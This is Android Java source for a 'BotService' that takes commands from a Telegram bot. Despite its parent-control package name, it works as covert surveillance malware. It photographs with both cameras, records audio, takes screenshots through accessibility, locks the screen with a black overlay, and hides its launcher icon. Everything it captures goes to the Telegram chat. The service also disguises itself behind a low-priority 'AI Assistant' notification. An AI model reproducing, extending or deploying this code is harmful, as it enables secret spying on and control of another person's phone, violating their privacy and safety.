package com.parentcontrol;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.view.View;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class BotService extends Service {

    private static final String CHANNEL_ID = "status_service";
    private static BotService instance;

    public static BotService getInstance() { return instance; }
    public ExecutorService getWorkers() { return workers; }

    private long lastUpdateId = 0;
    private boolean running = false;
    private ExecutorService executor;
    private ExecutorService workers;
    private OkHttpClient client;
    private OkHttpClient sender;

    private String waitingFor = null;
    private String waitingChatId = null;

    // Блокировка экрана (overlay fallback)
    private WindowManager windowManager;
    private View overlayView;
    private boolean isScreenLocked = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        client = new OkHttpClient.Builder()
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .build();
        sender = new OkHttpClient.Builder()
            .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
            .build();

        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("ИИ Асистент")
            .setContentText("Активен")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
        startForeground(1, notification);

        running = true;
        executor = Executors.newSingleThreadExecutor();
        workers = Executors.newFixedThreadPool(4);
        executor.execute(this::pollLoop);
        AppLogger.log("Сервис запущен");
        instance = this;
        StatusAccessibilityService.setBotService(this);
        return START_STICKY;
    }

    private void pollLoop() {
        while (running) {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN +
                    "/getUpdates?timeout=5&offset=" + (lastUpdateId + 1);
                Request request = new Request.Builder().url(url).build();
                Response response = client.newCall(request).execute();
                String body = response.body().string();
                response.close();

                JSONObject json = new JSONObject(body);
                if (!json.getBoolean("ok")) continue;

                JSONArray updates = json.getJSONArray("result");
                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getLong("update_id");
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String fromId = message.getJSONObject("chat").getString("id");
                        if (message.has("text")) {
                            handleMessage(message.getString("text"), fromId);
                        }
                    }
                }
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    private void handleMessage(String text, String fromChatId) {
        String cmd = text.trim().toLowerCase();
        if (cmd.contains("@")) cmd = cmd.substring(0, cmd.indexOf("@"));

        if (waitingFor != null && fromChatId.equals(waitingChatId)) {
            if ("record_seconds".equals(waitingFor)) {
                try {
                    int seconds = Integer.parseInt(text.trim());
                    if (seconds < 1 || seconds > 3600) {
                        sendTextTo(fromChatId, "Введи число от 1 до 3600");
                    } else {
                        waitingFor = null;
                        waitingChatId = null;
                        sendTextTo(fromChatId, "Начинаю запись на " + seconds + " сек...");
                        final String cid = fromChatId;
                        workers.execute(() -> AudioHelper.record(this, client, cid, seconds));
                    }
                } catch (NumberFormatException e) {
                    sendTextTo(fromChatId, "Введи число (например: 30)");
                }
                return;
            }
        }

        switch (cmd) {
            case "/start":
            case "/menu":
                sendMenuInfo(fromChatId);
                break;
            case "/camera":
                sendTextTo(fromChatId, "Снимаю фото...");
                workers.execute(() -> CameraHelper.takePhoto(this, client, fromChatId));
                break;
            case "/selfie":
                sendTextTo(fromChatId, "Снимаю фронталку...");
                workers.execute(() -> CameraHelper.takeFrontPhoto(this, client, fromChatId));
                break;
            case "/record":
                waitingFor = "record_seconds";
                waitingChatId = fromChatId;
                sendTextTo(fromChatId, "Введи количество секунд (например: 30):");
                break;
            case "/screenshot":
                doScreenshot(fromChatId);
                break;
            case "/lock":
                lockScreen(fromChatId);
                break;
            case "/unlock":
                unlockScreen(fromChatId);
                break;
            case "/hide":
                updateIconStatus(false);
                sendTextTo(fromChatId, "Иконка скрыта");
                break;
            case "/show":
                updateIconStatus(true);
                sendTextTo(fromChatId, "Иконка видима");
                break;
            default:
                sendMenuInfo(fromChatId);
                break;
        }
    }

    private void sendMenuInfo(String chatId) {
        String msg = "Список команд:\n\n" +
            "/camera - Задняя камера\n" +
            "/selfie - Фронтальная камера\n" +
            "/record - Запись аудио\n" +
            "/screenshot - Скриншот экрана\n" +
            "/lock - Заблокировать экран\n" +
            "/unlock - Разблокировать экран\n" +
            "/hide - Скрыть иконку\n" +
            "/show - Показать иконку";
        sendTextTo(chatId, msg);
    }

    private void updateIconStatus(boolean show) {
        android.content.ComponentName componentName = new android.content.ComponentName(this, MainActivity.class);
        int newState = show ? android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED :
                             android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        if (getPackageManager().getComponentEnabledSetting(componentName) != newState) {
            getPackageManager().setComponentEnabledSetting(componentName, newState,
                android.content.pm.PackageManager.DONT_KILL_APP);
        }
    }

    private void lockScreen(String chatId) {
        StatusAccessibilityService svc = StatusAccessibilityService.getInstance();
        if (svc != null) {
            svc.lockScreen();
            sendTextTo(chatId, "Экран заблокирован");
            return;
        }
        if (isScreenLocked) {
            sendTextTo(chatId, "Уже заблокировано");
            return;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            sendTextTo(chatId, "Нет разрешения SYSTEM_ALERT_WINDOW");
            return;
        }
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            try {
                windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
                overlayView = new View(this);
                overlayView.setBackgroundColor(0xFF000000);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.OPAQUE);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    params.layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                }
                overlayView.setOnTouchListener((v, event) -> true);
                windowManager.addView(overlayView, params);
                isScreenLocked = true;
                sendTextTo(chatId, "Экран заблокирован");
            } catch (Exception e) {
                sendTextTo(chatId, "Ошибка блокировки: " + e.getMessage());
            }
        });
    }

    private void unlockScreen(String chatId) {
        if (!isScreenLocked || overlayView == null) {
            sendTextTo(chatId, "Экран не заблокирован");
            return;
        }
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            try {
                windowManager.removeView(overlayView);
                overlayView = null;
                isScreenLocked = false;
                sendTextTo(chatId, "Экран разблокирован");
            } catch (Exception e) {
                sendTextTo(chatId, "Ошибка разблокировки: " + e.getMessage());
            }
        });
    }

    private void doScreenshot(String chatId) {
        StatusAccessibilityService svc = StatusAccessibilityService.getInstance();
        if (svc == null) {
            sendTextTo(chatId, "Спец. возможности не активны. Включи Status в Настройки -> Спец. возможности");
            return;
        }
        sendTextTo(chatId, "Делаю скриншот...");
        svc.takeScreenshot(chatId);
    }

    public void sendTextTo(String chatId, String text) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("text", text);
            sendJson("sendMessage", body);
        } catch (Exception ignored) {}
    }

    public void sendJson(String method, JSONObject body) {
        try {
            RequestBody requestBody = RequestBody.create(
                body.toString(), MediaType.parse("application/json"));
            Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/" + method)
                .post(requestBody)
                .build();
            Response response = sender.newCall(request).execute();
            response.close();
        } catch (Exception ignored) {}
    }

    public void sendFile(File file, String caption, String chatId) {
        try {
            RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("document", file.getName(),
                    RequestBody.create(file, MediaType.parse("application/octet-stream")))
                .build();
            Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendDocument")
                .post(requestBody)
                .build();
            Response response = sender.newCall(request).execute();
            response.close();
        } catch (Exception e) {
            sendTextTo(chatId, "Ошибка отправки файла: " + e.getMessage());
        }
    }

    public void sendPhoto(File file, String chatId) {
        try {
            if (file == null) { sendTextTo(chatId, "Ошибка: file null"); return; }
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            fis.close();
            RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("photo", "photo.png",
                    RequestBody.create(bytes, MediaType.parse("image/png")))
                .build();
            Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendPhoto")
                .post(requestBody)
                .build();
            Response response = sender.newCall(request).execute();
            response.close();
        } catch (Exception e) {
            sendTextTo(chatId, "Ошибка отправки фото: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
            CHANNEL_ID, "Status", NotificationManager.IMPORTANCE_MIN);
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
    }

    @Override
    public void onDestroy() {
        running = false;
        instance = null;
        if (executor != null) executor.shutdownNow();
        if (workers != null) workers.shutdownNow();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
